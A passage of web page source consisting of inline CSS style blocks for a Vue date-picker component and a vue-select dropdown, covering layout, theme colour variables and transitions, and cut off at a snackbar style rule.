        }

        .dp--preset-range {
            border-radius: var(--dp-border-radius);
            color: var(--dp-text-color);
            display: block;
            padding: 5px;
            text-align: left;
            transition: var(--dp-common-transition);
            white-space: nowrap;
            width: 100%
        }

        .dp--preset-range:hover {
            background-color: var(--dp-hover-color);
            color: var(--dp-hover-text-color);
            cursor: pointer
        }

        @media only screen and (width <=600px) {
            .dp--preset-range {
                border: 1px solid var(--dp-border-color);
                margin: 0 3px
            }

            .dp--preset-range:first-child {
                margin-left: 0
            }

            .dp--preset-range:last-child {
                margin-right: 0
            }
        }

        .dp--preset-range-collapsed {
            border: 1px solid var(--dp-border-color);
            margin: 0 3px
        }

        .dp--preset-range-collapsed:first-child {
            margin-left: 0
        }

        .dp--preset-range-collapsed:last-child {
            margin-right: 0
        }

        .dp__menu_content_wrapper {
            display: flex
        }

        @media only screen and (width <=600px) {
            .dp__menu_content_wrapper {
                flex-direction: column-reverse
            }
        }

        .dp--menu-content-wrapper-collapsed {
            flex-direction: column-reverse
        }

        .dp__calendar_header {
            align-items: center;
            color: var(--dp-text-color);
            display: flex;
            font-weight: 700;
            justify-content: center;
            position: relative;
            white-space: nowrap
        }

        .dp__calendar_header_item {
            box-sizing: border-box;
            flex-grow: 1;
            height: var(--dp-cell-size);
            padding: var(--dp-cell-padding);
            text-align: center;
            width: var(--dp-cell-size)
        }

        .dp__calendar_row {
            align-items: center;
            display: flex;
            justify-content: center;
            margin: var(--dp-row-margin)
        }

        .dp__calendar_item {
            box-sizing: border-box;
            color: var(--dp-text-color);
            flex-grow: 1;
            text-align: center
        }

        .dp__calendar {
            position: relative
        }

        .dp__calendar_header_cell {
            border-bottom: thin solid var(--dp-border-color);
            padding: var(--dp-calendar-header-cell-padding)
        }

        .dp__cell_inner {
            align-items: center;
            border: 1px solid transparent;
            border-radius: var(--dp-cell-border-radius);
            box-sizing: border-box;
            display: flex;
            height: var(--dp-cell-size);
            justify-content: center;
            padding: var(--dp-cell-padding);
            position: relative;
            text-align: center;
            width: var(--dp-cell-size)
        }

        .dp__cell_inner:hover {
            transition: all .2s
        }

        .dp__cell_auto_range_start,
        .dp__date_hover_start:hover,
        .dp__range_start {
            border-end-end-radius: 0;
            border-start-end-radius: 0
        }

        .dp__cell_auto_range_end,
        .dp__date_hover_end:hover,
        .dp__range_end {
            border-end-start-radius: 0;
            border-start-start-radius: 0
        }

        .dp__active_date,
        .dp__range_end,
        .dp__range_start {
            background: var(--dp-primary-color);
            color: var(--dp-primary-text-color)
        }

        .dp__date_hover:hover,
        .dp__date_hover_end:hover,
        .dp__date_hover_start:hover {
            background: var(--dp-hover-color);
            color: var(--dp-hover-text-color)
        }

        .dp__cell_disabled,
        .dp__cell_offset {
            color: var(--dp-secondary-color)
        }

        .dp__cell_disabled {
            cursor: not-allowed
        }

        .dp__range_between {
            background: var(--dp-range-between-dates-background-color);
            border: 1px solid var(--dp-range-between-border-color);
            border-radius: 0;
            color: var(--dp-range-between-dates-text-color)
        }

        .dp__range_between_week {
            background: var(--dp-primary-color);
            border-bottom: 1px solid var(--dp-primary-color);
            border-radius: 0;
            border-top: 1px solid var(--dp-primary-color);
            color: var(--dp-primary-text-color)
        }

        .dp__today {
            border: 1px solid var(--dp-primary-color)
        }

        .dp__week_num {
            color: var(--dp-secondary-color);
            text-align: center
        }

        .dp__cell_auto_range {
            border-bottom: 1px dashed var(--dp-primary-color);
            border-radius: 0;
            border-top: 1px dashed var(--dp-primary-color)
        }

        .dp__cell_auto_range_start {
            border-bottom: 1px dashed var(--dp-primary-color);
            border-end-start-radius: var(--dp-cell-border-radius);
            border-inline-start: 1px dashed var(--dp-primary-color);
            border-start-start-radius: var(--dp-cell-border-radius);
            border-top: 1px dashed var(--dp-primary-color)
        }

        .dp__cell_auto_range_end {
            border-bottom: 1px dashed var(--dp-primary-color);
            border-end-end-radius: var(--dp-cell-border-radius);
            border-inline-end: 1px dashed var(--dp-primary-color);
            border-start-end-radius: var(--dp-cell-border-radius);
            border-top: 1px dashed var(--dp-primary-color)
        }

        .dp__calendar_header_separator {
            background: var(--dp-border-color);
            height: 1px;
            width: 100%
        }

        .dp__calendar_next {
            margin-inline-start: var(--dp-multi-calendars-spacing)
        }

        .dp__marker_dot,
        .dp__marker_line {
            background-color: var(--dp-marker-color);
            bottom: 0;
            height: 5px;
            position: absolute
        }

        .dp__marker_dot {
            border-radius: 50%;
            left: 50%;
            transform: translate(-50%);
            width: 5px
        }

        .dp__marker_line {
            left: 0;
            width: 100%
        }

        .dp__marker_tooltip {
            background-color: var(--dp-tooltip-color);
            border: 1px solid var(--dp-border-color);
            border-radius: var(--dp-border-radius);
            box-sizing: border-box;
            cursor: default;
            padding: 5px;
            position: absolute;
            z-index: 99999
        }

        .dp__tooltip_content {
            white-space: nowrap
        }

        .dp__tooltip_text {
            align-items: center;
            color: var(--dp-text-color);
            display: flex;
            flex-flow: row nowrap
        }

        .dp__tooltip_mark {
            background-color: var(--dp-text-color);
            border-radius: 50%;
            color: var(--dp-text-color);
            height: 5px;
            margin-inline-end: 5px;
            width: 5px
        }

        .dp__arrow_bottom_tp {
            background-color: var(--dp-tooltip-color);
            border-bottom: 1px solid var(--dp-border-color);
            border-inline-end: 1px solid var(--dp-border-color);
            bottom: 0;
            height: 8px;
            position: absolute;
            transform: translate(-50%, 50%) rotate(45deg);
            width: 8px
        }

        .dp__instance_calendar {
            position: relative;
            width: 100%
        }

        @media only screen and (width <=600px) {
            .dp__flex_display {
                flex-direction: column
            }
        }

        .dp--flex-display-collapsed {
            flex-direction: column
        }

        .dp__cell_highlight {
            background-color: var(--dp-highlight-color)
        }

        .dp__month_year_row {
            align-items: center;
            box-sizing: border-box;
            color: var(--dp-text-color);
            display: flex;
            height: var(--dp-month-year-row-height)
        }

        .dp__inner_nav {
            align-items: center;
            border-radius: 50%;
            color: var(--dp-icon-color);
            cursor: pointer;
            display: flex;
            height: var(--dp-month-year-row-button-size);
            justify-content: center;
            text-align: center;
            width: var(--dp-month-year-row-button-size)
        }

        .dp__inner_nav svg {
            height: var(--dp-button-icon-height);
            width: var(--dp-button-icon-height)
        }

        .dp__inner_nav:hover {
            background: var(--dp-hover-color);
            color: var(--dp-hover-icon-color)
        }

        [dir=rtl] .dp__inner_nav {
            transform: rotate(180deg)
        }

        .dp__inner_nav_disabled,
        .dp__inner_nav_disabled:hover {
            background: var(--dp-disabled-color);
            color: var(--dp-disabled-color-text);
            cursor: not-allowed
        }

        .dp--year-select,
        .dp__month_year_select {
            align-items: center;
            border-radius: var(--dp-border-radius);
            box-sizing: border-box;
            color: var(--dp-text-color);
            cursor: pointer;
            display: flex;
            height: var(--dp-month-year-row-height);
            justify-content: center;
            text-align: center
        }

        .dp--year-select:hover,
        .dp__month_year_select:hover {
            background: var(--dp-hover-color);
            color: var(--dp-hover-text-color);
            transition: var(--dp-common-transition)
        }

        .dp__month_year_select {
            width: 50%
        }

        .dp--year-select {
            width: 100%
        }

        .dp__month_year_wrap {
            display: flex;
            flex-direction: row;
            width: 100%
        }

        .dp__year_disable_select {
            justify-content: space-around
        }

        .dp--header-wrap {
            display: flex;
            flex-direction: column;
            width: 100%
        }

        .dp__overlay {
            background: var(--dp-background-color);
            box-sizing: border-box;
            color: var(--dp-text-color);
            font-family: var(--dp-font-family);
            transition: opacity 1s ease-out;
            width: 100%;
            z-index: 99999
        }

        .dp--overlay-absolute {
            height: 100%;
            left: 0;
            position: absolute;
            top: 0
        }

        .dp--overlay-relative {
            position: relative
        }

        .dp__overlay_container::-webkit-scrollbar-track {
            background-color: var(--dp-scroll-bar-background);
            box-shadow: var(--dp-scroll-bar-background)
        }

        .dp__overlay_container::-webkit-scrollbar {
            background-color: var(--dp-scroll-bar-background);
            width: 5px
        }

        .dp__overlay_container::-webkit-scrollbar-thumb {
            background-color: var(--dp-scroll-bar-color);
            border-radius: 10px
        }

        .dp__overlay:focus {
            border: none;
            outline: none
        }

        .dp__container_flex {
            display: flex
        }

        .dp__container_block {
            display: block
        }

        .dp__overlay_container {
            flex-direction: column;
            height: var(--dp-overlay-height);
            overflow-y: auto
        }

        .dp__time_picker_overlay_container {
            height: 100%
        }

        .dp__overlay_row {
            align-items: center;
            box-sizing: border-box;
            display: flex;
            flex-wrap: wrap;
            margin-inline: auto auto;
            max-width: 100%;
            padding: 0;
            width: 100%
        }

        .dp__flex_row {
            flex: 1
        }

        .dp__overlay_col {
            box-sizing: border-box;
            padding: var(--dp-overlay-col-padding);
            white-space: nowrap;
            width: 33%
        }

        .dp__overlay_cell_pad {
            padding: var(--dp-common-padding) 0
        }

        .dp__overlay_cell_active {
            background: var(--dp-primary-color);
            color: var(--dp-primary-text-color)
        }

        .dp__overlay_cell,
        .dp__overlay_cell_active {
            border-radius: var(--dp-border-radius);
            cursor: pointer;
            text-align: center
        }

        .dp__overlay_cell:hover {
            transition: var(--dp-common-transition)
        }

        .dp__cell_in_between,
        .dp__overlay_cell:hover {
            background: var(--dp-hover-color);
            color: var(--dp-hover-text-color)
        }

        .dp__over_action_scroll {
            box-sizing: border-box;
            right: 5px
        }

        .dp__overlay_cell_disabled {
            cursor: not-allowed
        }

        .dp__overlay_cell_disabled,
        .dp__overlay_cell_disabled:hover {
            background: var(--dp-disabled-color)
        }

        .dp__overlay_cell_active_disabled {
            cursor: not-allowed
        }

        .dp__overlay_cell_active_disabled,
        .dp__overlay_cell_active_disabled:hover {
            background: var(--dp-primary-disabled-color)
        }

        .dp--tp-wrap {
            max-width: var(--dp-menu-min-width)
        }

        .dp__time_input {
            align-items: center;
            color: var(--dp-text-color);
            display: flex;
            font-family: var(--dp-font-family);
            justify-content: center;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
            width: 100%
        }

        .dp__time_col_reg_block {
            padding: 0 20px
        }

        .dp__time_col_reg_inline {
            padding: 0 10px
        }

        .dp__time_col_reg_with_button {
            padding: 0 15px
        }

        .dp__time_col_sec {
            padding: 0 10px
        }

        .dp__time_col_sec_with_button {
            padding: 0 5px
        }

        .dp__time_col {
            align-items: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            text-align: center
        }

        .dp__time_col_block {
            font-size: var(--dp-time-font-size)
        }

        .dp__time_display_block {
            padding: 0 3px
        }

        .dp__time_display_inline {
            padding: 5px
        }

        .dp__time_picker_inline_container {
            display: flex;
            justify-content: center;
            width: 100%
        }

        .dp__inc_dec_button {
            align-items: center;
            border-radius: 50%;
            box-sizing: border-box;
            color: var(--dp-icon-color);
            cursor: pointer;
            display: flex;
            justify-content: center;
            margin: 0;
            padding: 5px
        }

        .dp__inc_dec_button,
        .dp__inc_dec_button svg {
            height: var(--dp-time-inc-dec-button-size);
            width: var(--dp-time-inc-dec-button-size)
        }

        .dp__inc_dec_button:hover {
            background: var(--dp-hover-color);
            color: var(--dp-primary-color)
        }

        .dp__time_display {
            align-items: center;
            border-radius: var(--dp-border-radius);
            color: var(--dp-text-color);
            cursor: pointer;
            display: flex;
            justify-content: center
        }

        .dp__time_display:hover:enabled {
            background: var(--dp-hover-color);
            color: var(--dp-hover-text-color)
        }

        .dp__inc_dec_button_inline {
            align-items: center;
            cursor: pointer;
            display: flex;
            height: 8px;
            padding: 0;
            width: 100%
        }

        .dp__inc_dec_button_disabled,
        .dp__inc_dec_button_disabled:hover {
            background: var(--dp-disabled-color);
            color: var(--dp-disabled-color-text);
            cursor: not-allowed
        }

        .dp__pm_am_button {
            background: var(--dp-primary-color);
            border: none;
            border-radius: var(--dp-border-radius);
            color: var(--dp-primary-text-color);
            cursor: pointer;
            padding: var(--dp-common-padding)
        }

        .dp__tp_inline_btn_bar {
            background-color: var(--dp-secondary-color);
            border-collapse: collapse;
            height: 4px;
            transition: var(--dp-common-transition);
            width: 100%
        }

        .dp__tp_inline_btn_top:hover .dp__tp_btn_in_r {
            background-color: var(--dp-primary-color);
            transform: rotate(12deg) scale(1.15) translateY(-2px)
        }

        .dp__tp_inline_btn_bottom:hover .dp__tp_btn_in_r,
        .dp__tp_inline_btn_top:hover .dp__tp_btn_in_l {
            background-color: var(--dp-primary-color);
            transform: rotate(-12deg) scale(1.15) translateY(-2px)
        }

        .dp__tp_inline_btn_bottom:hover .dp__tp_btn_in_l {
            background-color: var(--dp-primary-color);
            transform: rotate(12deg) scale(1.15) translateY(-2px)
        }

        .dp--time-overlay-btn {
            background: none
        }

        .dp--time-invalid {
            background-color: var(--dp-disabled-color)
        }

        .dp__action_row {
            align-items: center;
            box-sizing: border-box;
            color: var(--dp-text-color);
            display: flex;
            flex-flow: row nowrap;
            padding: var(--dp-action-row-padding);
            width: 100%
        }

        .dp__action_row svg {
            height: var(--dp-button-icon-height);
            width: auto
        }

        .dp__selection_preview {
            color: var(--dp-text-color);
            display: block;
            font-size: var(--dp-preview-font-size);
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        .dp__action_buttons {
            align-items: center;
            display: flex;
            flex: 0;
            justify-content: flex-end;
            margin-inline-start: auto;
            white-space: nowrap
        }

        .dp__action_button {
            align-items: center;
            background: transparent;
            border: 1px solid transparent;
            border-radius: var(--dp-border-radius);
            cursor: pointer;
            display: inline-flex;
            font-family: var(--dp-font-family);
            font-size: var(--dp-preview-font-size);
            height: var(--dp-action-button-height);
            line-height: var(--dp-action-button-height);
            margin-inline-start: 3px;
            padding: var(--dp-action-buttons-padding)
        }

        .dp__action_cancel {
            border: 1px solid var(--dp-border-color);
            color: var(--dp-text-color)
        }

        .dp__action_cancel:hover {
            border-color: var(--dp-primary-color);
            transition: var(--dp-action-row-transtion)
        }

        .dp__action_buttons .dp__action_select {
            background: var(--dp-primary-color);
            color: var(--dp-primary-text-color)
        }

        .dp__action_buttons .dp__action_select:hover {
            background: var(--dp-primary-color);
            transition: var(--dp-action-row-transtion)
        }

        .dp__action_buttons .dp__action_select:disabled {
            background: var(--dp-primary-disabled-color);
            cursor: not-allowed
        }

        .dp-quarter-picker-wrap {
            display: flex;
            flex-direction: column;
            height: 100%;
            min-width: var(--dp-menu-min-width)
        }

        .dp--qr-btn-disabled {
            cursor: not-allowed
        }

        .dp--qr-btn-disabled,
        .dp--qr-btn-disabled:hover {
            background: var(--dp-disabled-color)
        }

        .dp--qr-btn {
            padding: var(--dp-common-padding);
            width: 100%
        }

        .dp--qr-btn:not(.dp--highlighted, .dp--qr-btn-active, .dp--qr-btn-disabled, .dp--qr-btn-between) {
            background: none
        }

        .dp--qr-btn:hover:not(.dp--qr-btn-active, .dp--qr-btn-disabled) {
            background: var(--dp-hover-color);
            color: var(--dp-hover-text-color);
            transition: var(--dp-common-transition)
        }

        .dp--quarter-items {
            display: flex;
            flex: 1;
            flex-direction: column;
            height: 100%;
            justify-content: space-evenly;
            width: 100%
        }

        .dp--qr-btn-active {
            background: var(--dp-primary-color);
            color: var(--dp-primary-text-color)
        }

        .dp--qr-btn-between {
            background: var(--dp-hover-color);
            color: var(--dp-hover-text-color)
        }

        .dp--qr-btn,
        .dp--time-invalid,
        .dp--time-overlay-btn,
        .dp__btn {
            border: none;
            font: inherit;
            line-height: normal;
            transition: var(--dp-common-transition)
        }

        .dp--year-mode-picker {
            align-items: center;
            display: flex;
            height: var(--dp-cell-size);
            justify-content: space-between;
            width: 100%
        }

        :root {
            --dp-common-transition: all .1s ease-in;
            --dp-menu-padding: 6px 8px;
            --dp-animation-duration: .1s;
            --dp-menu-appear-transition-timing: cubic-bezier(.4, 0, 1, 1);
            --dp-transition-timing: ease-out;
            --dp-action-row-transtion: all .2s ease-in;
            --dp-font-family: -apple-system, blinkmacsystemfont, "Segoe UI", roboto, oxygen, ubuntu, cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            --dp-border-radius: 4px;
            --dp-cell-border-radius: 4px;
            --dp-transition-length: 22px;
            --dp-transition-timing-general: .1s;
            --dp-button-height: 35px;
            --dp-month-year-row-height: 35px;
            --dp-month-year-row-button-size: 25px;
            --dp-button-icon-height: 20px;
            --dp-calendar-wrap-padding: 0 5px;
            --dp-cell-size: 35px;
            --dp-cell-padding: 5px;
            --dp-common-padding: 10px;
            --dp-input-icon-padding: 35px;
            --dp-input-padding: 6px 30px 6px 12px;
            --dp-menu-min-width: 260px;
            --dp-action-buttons-padding: 1px 6px;
            --dp-row-margin: 5px 0;
            --dp-calendar-header-cell-padding: .5rem;
            --dp-multi-calendars-spacing: 10px;
            --dp-overlay-col-padding: 3px;
            --dp-time-inc-dec-button-size: 32px;
            --dp-font-size: 1rem;
            --dp-preview-font-size: .8rem;
            --dp-time-font-size: 2rem;
            --dp-action-button-height: 22px;
            --dp-action-row-padding: 8px;
            --dp-direction: ltr
        }

        .dp__theme_dark {
            --dp-background-color: #212121;
            --dp-text-color: #fff;
            --dp-hover-color: #484848;
            --dp-hover-text-color: #fff;
            --dp-hover-icon-color: #959595;
            --dp-primary-color: #005cb2;
            --dp-primary-disabled-color: #61a8ea;
            --dp-primary-text-color: #fff;
            --dp-secondary-color: #a9a9a9;
            --dp-border-color: #2d2d2d;
            --dp-menu-border-color: #2d2d2d;
            --dp-border-color-hover: #aaaeb7;
            --dp-border-color-focus: #aaaeb7;
            --dp-disabled-color: #737373;
            --dp-disabled-color-text: #d0d0d0;
            --dp-scroll-bar-background: #212121;
            --dp-scroll-bar-color: #484848;
            --dp-success-color: #00701a;
            --dp-success-color-disabled: #428f59;
            --dp-icon-color: #959595;
            --dp-danger-color: #e53935;
            --dp-marker-color: #e53935;
            --dp-tooltip-color: #3e3e3e;
            --dp-highlight-color: rgba(0, 92, 178, .2);
            --dp-range-between-dates-background-color: var(--dp-hover-color, #484848);
            --dp-range-between-dates-text-color: var(--dp-hover-text-color, #fff);
            --dp-range-between-border-color: var(--dp-hover-color, #fff);
            --dp-loader: 5px solid #005cb2
        }

        .dp__theme_light {
            --dp-background-color: #fff;
            --dp-text-color: #212121;
            --dp-hover-color: #f3f3f3;
            --dp-hover-text-color: #212121;
            --dp-hover-icon-color: #959595;
            --dp-primary-color: #1976d2;
            --dp-primary-disabled-color: #6bacea;
            --dp-primary-text-color: #fff;
            --dp-secondary-color: #c0c4cc;
            --dp-border-color: #ddd;
            --dp-menu-border-color: #ddd;
            --dp-border-color-hover: #aaaeb7;
            --dp-border-color-focus: #aaaeb7;
            --dp-disabled-color: #f6f6f6;
            --dp-scroll-bar-background: #f3f3f3;
            --dp-scroll-bar-color: #959595;
            --dp-success-color: #76d275;
            --dp-success-color-disabled: #a3d9b1;
            --dp-icon-color: #959595;
            --dp-danger-color: #ff6f60;
            --dp-marker-color: #ff6f60;
            --dp-tooltip-color: #fafafa;
            --dp-disabled-color-text: #8e8e8e;
            --dp-highlight-color: rgba(25, 118, 210, .1);
            --dp-range-between-dates-background-color: var(--dp-hover-color, #f3f3f3);
            --dp-range-between-dates-text-color: var(--dp-hover-text-color, #212121);
            --dp-range-between-border-color: var(--dp-hover-color, #f3f3f3);
            --dp-loader: 5px solid #1976d2
        }

        .dp__flex {
            align-items: center;
            display: flex
        }

        .dp__btn {
            background: none
        }

        .dp__main {
            box-sizing: border-box;
            font-family: var(--dp-font-family);
            position: relative;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
            width: 100%
        }

        .dp__main * {
            direction: var(--dp-direction, ltr)
        }

        .dp__pointer {
            cursor: pointer
        }

        .dp__icon {
            stroke: currentcolor;
            fill: currentcolor
        }

        .dp__button {
            align-items: center;
            box-sizing: border-box;
            color: var(--dp-icon-color);
            cursor: pointer;
            display: flex;
            height: var(--dp-button-height);
            padding: var(--dp-common-padding);
            place-content: center center;
            text-align: center;
            width: 100%
        }

        .dp__button.dp__overlay_action {
            bottom: 0;
            position: absolute
        }

        .dp__button:hover {
            background: var(--dp-hover-color);
            color: var(--dp-hover-icon-color)
        }

        .dp__button svg {
            height: var(--dp-button-icon-height);
            width: auto
        }

        .dp__button_bottom {
            border-bottom-left-radius: var(--dp-border-radius);
            border-bottom-right-radius: var(--dp-border-radius)
        }

        .dp__flex_display {
            display: flex
        }

        .dp__flex_display_with_input {
            align-items: flex-start;
            flex-direction: column
        }

        .dp__relative {
            position: relative
        }

        .calendar-next-enter-active,
        .calendar-next-leave-active,
        .calendar-prev-enter-active,
        .calendar-prev-leave-active {
            transition: all var(--dp-transition-timing-general) ease-out
        }

        .calendar-next-enter-from {
            opacity: 0;
            transform: translate(var(--dp-transition-length))
        }

        .calendar-next-leave-to,
        .calendar-prev-enter-from {
            opacity: 0;
            transform: translate(calc(var(--dp-transition-length)*-1))
        }

        .calendar-prev-leave-to {
            opacity: 0;
            transform: translate(var(--dp-transition-length))
        }

        .dp-menu-appear-bottom-enter-active,
        .dp-menu-appear-bottom-leave-active,
        .dp-menu-appear-top-enter-active,
        .dp-menu-appear-top-leave-active,
        .dp-slide-down-enter-active,
        .dp-slide-down-leave-active,
        .dp-slide-up-enter-active,
        .dp-slide-up-leave-active {
            transition: all var(--dp-animation-duration) var(--dp-transition-timing)
        }

        .dp-menu-appear-top-enter-from,
        .dp-menu-appear-top-leave-to,
        .dp-slide-down-leave-to,
        .dp-slide-up-enter-from {
            opacity: 0;
            transform: translateY(var(--dp-transition-length))
        }

        .dp-menu-appear-bottom-enter-from,
        .dp-menu-appear-bottom-leave-to,
        .dp-slide-down-enter-from,
        .dp-slide-up-leave-to {
            opacity: 0;
            transform: translateY(calc(var(--dp-transition-length)*-1))
        }

        .dp--arrow-btn-nav {
            transition: var(--dp-common-transition)
        }

        .dp--highlighted {
            background-color: var(--dp-highlight-color)
        }

        .dp--hidden-el {
            visibility: hidden
        }
    </style>
    <style>
        :root {
            --vs-colors--lightest: rgba(60, 60, 60, .26);
            --vs-colors--light: rgba(60, 60, 60, .5);
            --vs-colors--dark: #333;
            --vs-colors--darkest: rgba(0, 0, 0, .15);
            --vs-search-input-color: inherit;
            --vs-search-input-placeholder-color: inherit;
            --vs-font-size: 1rem;
            --vs-line-height: 1.4;
            --vs-state-disabled-bg: #f8f8f8;
            --vs-state-disabled-color: var(--vs-colors--light);
            --vs-state-disabled-controls-color: var(--vs-colors--light);
            --vs-state-disabled-cursor: not-allowed;
            --vs-border-color: var(--vs-colors--lightest);
            --vs-border-width: 1px;
            --vs-border-style: solid;
            --vs-border-radius: 4px;
            --vs-actions-padding: 4px 6px 0 3px;
            --vs-controls-color: var(--vs-colors--light);
            --vs-controls-size: 1;
            --vs-controls--deselect-text-shadow: 0 1px 0 #fff;
            --vs-selected-bg: #f0f0f0;
            --vs-selected-color: var(--vs-colors--dark);
            --vs-selected-border-color: var(--vs-border-color);
            --vs-selected-border-style: var(--vs-border-style);
            --vs-selected-border-width: var(--vs-border-width);
            --vs-dropdown-bg: #fff;
            --vs-dropdown-color: inherit;
            --vs-dropdown-z-index: 1000;
            --vs-dropdown-min-width: 160px;
            --vs-dropdown-max-height: 350px;
            --vs-dropdown-box-shadow: 0px 3px 6px 0px var(--vs-colors--darkest);
            --vs-dropdown-option-bg: #000;
            --vs-dropdown-option-color: var(--vs-dropdown-color);
            --vs-dropdown-option-padding: 3px 20px;
            --vs-dropdown-option--active-bg: #5897fb;
            --vs-dropdown-option--active-color: #fff;
            --vs-dropdown-option--deselect-bg: #fb5858;
            --vs-dropdown-option--deselect-color: #fff;
            --vs-transition-timing-function: cubic-bezier(1, -.115, .975, .855)
        }

        .v-select {
            font-family: inherit;
            position: relative
        }

        .v-select,
        .v-select * {
            box-sizing: border-box
        }

        :root {
            --vs-transition-timing-function: cubic-bezier(1, .5, .8, 1);
            --vs-transition-duration: .15s
        }

        @keyframes vSelectSpinner {
            0% {
                transform: rotate(0)
            }

            to {
                transform: rotate(1turn)
            }
        }

        .vs__fade-enter-active,
        .vs__fade-leave-active {
            pointer-events: none;
            transition: opacity var(--vs-transition-duration) var(--vs-transition-timing-function)
        }

        .vs__fade-enter,
        .vs__fade-leave-to {
            opacity: 0
        }

        :root {
            --vs-disabled-bg: var(--vs-state-disabled-bg);
            --vs-disabled-color: var(--vs-state-disabled-color);
            --vs-disabled-cursor: var(--vs-state-disabled-cursor)
        }

        .vs--disabled .vs__clear,
        .vs--disabled .vs__dropdown-toggle,
        .vs--disabled .vs__open-indicator,
        .vs--disabled .vs__search,
        .vs--disabled .vs__selected {
            background-color: var(--vs-disabled-bg);
            cursor: var(--vs-disabled-cursor)
        }

        .v-select[dir=rtl] .vs__actions {
            padding: 0 3px 0 6px
        }

        .v-select[dir=rtl] .vs__clear {
            margin-left: 6px;
            margin-right: 0
        }

        .v-select[dir=rtl] .vs__deselect {
            margin-left: 0;
            margin-right: 2px
        }

        .v-select[dir=rtl] .vs__dropdown-menu {
            text-align: right
        }

        .vs__dropdown-toggle {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background: none;
            border: var(--vs-border-width) var(--vs-border-style) var(--vs-border-color);
            border-radius: var(--vs-border-radius);
            display: flex;
            padding: 0 0 4px;
            white-space: normal
        }

        .vs__selected-options {
            display: flex;
            flex-basis: 100%;
            flex-grow: 1;
            flex-wrap: wrap;
            padding: 0 2px;
            position: relative
        }

        .vs__actions {
            align-items: center;
            display: flex;
            padding: var(--vs-actions-padding)
        }

        .vs--searchable .vs__dropdown-toggle {
            cursor: text
        }

        .vs--unsearchable .vs__dropdown-toggle {
            cursor: pointer
        }

        .vs--open .vs__dropdown-toggle {
            border-bottom-color: transparent;
            border-bottom-left-radius: 0;
            border-bottom-right-radius: 0
        }

        .vs__open-indicator {
            fill: var(--vs-controls-color);
            transform: scale(var(--vs-controls-size));
            transition: transform var(--vs-transition-duration) var(--vs-transition-timing-function);
            transition-timing-function: var(--vs-transition-timing-function)
        }

        .vs--open .vs__open-indicator {
            transform: rotate(180deg) scale(var(--vs-controls-size))
        }

        .vs--loading .vs__open-indicator {
            opacity: 0
        }

        .vs__clear {
            fill: var(--vs-controls-color);
            background-color: transparent;
            border: 0;
            cursor: pointer;
            margin-right: 8px;
            padding: 0
        }

        .vs__dropdown-menu {
            background: var(--vs-dropdown-bg);
            border: var(--vs-border-width) var(--vs-border-style) var(--vs-border-color);
            border-radius: 0 0 var(--vs-border-radius) var(--vs-border-radius);
            border-top-style: none;
            box-shadow: var(--vs-dropdown-box-shadow);
            box-sizing: border-box;
            color: var(--vs-dropdown-color);
            display: block;
            left: 0;
            list-style: none;
            margin: 0;
            max-height: var(--vs-dropdown-max-height);
            min-width: var(--vs-dropdown-min-width);
            overflow-y: auto;
            padding: 5px 0;
            position: absolute;
            text-align: left;
            top: calc(100% - var(--vs-border-width));
            width: 100%;
            z-index: var(--vs-dropdown-z-index)
        }

        .vs__no-options {
            text-align: center
        }

        .vs__dropdown-option {
            clear: both;
            color: var(--vs-dropdown-option-color);
            cursor: pointer;
            display: block;
            line-height: 1.42857143;
            padding: var(--vs-dropdown-option-padding);
            white-space: nowrap
        }

        .vs__dropdown-option--highlight {
            background: var(--vs-dropdown-option--active-bg);
            color: var(--vs-dropdown-option--active-color)
        }

        .vs__dropdown-option--deselect {
            background: var(--vs-dropdown-option--deselect-bg);
            color: var(--vs-dropdown-option--deselect-color)
        }

        .vs__dropdown-option--disabled {
            background: var(--vs-state-disabled-bg);
            color: var(--vs-state-disabled-color);
            cursor: var(--vs-state-disabled-cursor)
        }

        .vs__selected {
            align-items: center;
            background-color: var(--vs-selected-bg);
            border: var(--vs-selected-border-width) var(--vs-selected-border-style) var(--vs-selected-border-color);
            border-radius: var(--vs-border-radius);
            color: var(--vs-selected-color);
            display: flex;
            line-height: var(--vs-line-height);
            margin: 4px 2px 0;
            padding: 0 .25em;
            z-index: 0
        }

        .vs__deselect {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background: none;
            border: 0;
            cursor: pointer;
            display: inline-flex;
            margin-left: 4px;
            padding: 0;
            fill: var(--vs-controls-color);
            text-shadow: var(--vs-controls--deselect-text-shadow)
        }

        .vs--single .vs__selected {
            background-color: transparent;
            border-color: transparent
        }

        .vs--single.vs--loading .vs__selected,
        .vs--single.vs--open .vs__selected {
            opacity: .4;
            position: absolute
        }

        .vs--single.vs--searching .vs__selected {
            display: none
        }

        .vs__search::-webkit-search-cancel-button {
            display: none
        }

        .vs__search::-ms-clear,
        .vs__search::-webkit-search-decoration,
        .vs__search::-webkit-search-results-button,
        .vs__search::-webkit-search-results-decoration {
            display: none
        }

        .vs__search,
        .vs__search:focus {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            background: none;
            border: 1px solid transparent;
            border-left: none;
            box-shadow: none;
            color: var(--vs-search-input-color);
            flex-grow: 1;
            font-size: var(--vs-font-size);
            line-height: var(--vs-line-height);
            margin: 4px 0 0;
            max-width: 100%;
            outline: none;
            padding: 0 7px;
            width: 0;
            z-index: 1
        }

        .vs__search::-moz-placeholder {
            color: var(--vs-search-input-placeholder-color)
        }

        .vs__search::placeholder {
            color: var(--vs-search-input-placeholder-color)
        }

        .vs--unsearchable .vs__search {
            opacity: 1
        }

        .vs--unsearchable:not(.vs--disabled) .vs__search {
            cursor: pointer
        }

        .vs--single.vs--searching:not(.vs--open):not(.vs--loading) .vs__search {
            opacity: .2
        }

        .vs__spinner {
            align-self: center;
            animation: vSelectSpinner 1.1s linear infinite;
            border: .9em solid hsla(0, 0%, 39%, .1);
            border-left-color: #3c3c3c73;
            font-size: 5px;
            opacity: 0;
            overflow: hidden;
            text-indent: -9999em;
            transform: translateZ(0) scale(var(--vs-controls--spinner-size, var(--vs-controls-size)));
            transition: opacity .1s
        }

        .vs__spinner,
        .vs__spinner:after {
            border-radius: 50%;
            height: 5em;
            transform: scale(var(--vs-controls--spinner-size, var(--vs-controls-size)));
            width: 5em
        }

        .vs--loading .vs__spinner {
            opacity: 1
        }
    </style>
    <style>
        #vue3-snackbar--container {
            margin: 16px 16px 0;
            padding: 0;
            pointer-events: none;
